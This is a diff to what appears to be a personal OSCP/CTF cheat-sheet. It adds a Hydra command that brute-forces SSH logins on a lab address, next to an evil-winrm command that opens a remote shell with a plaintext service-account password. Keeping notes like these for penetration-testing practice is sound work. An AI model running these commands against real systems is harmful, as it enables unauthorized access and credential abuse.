@@ -2,6 +2,12 @@
 
 # OSCP / CTF
 
+Hydra Brute SSH
+```
+hydra -L users -P passwords 10.10.10.187 ssh
+```
+
+Evil-WINRM
 ```
 evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i 10.10.10.193 -P 5985
 ```
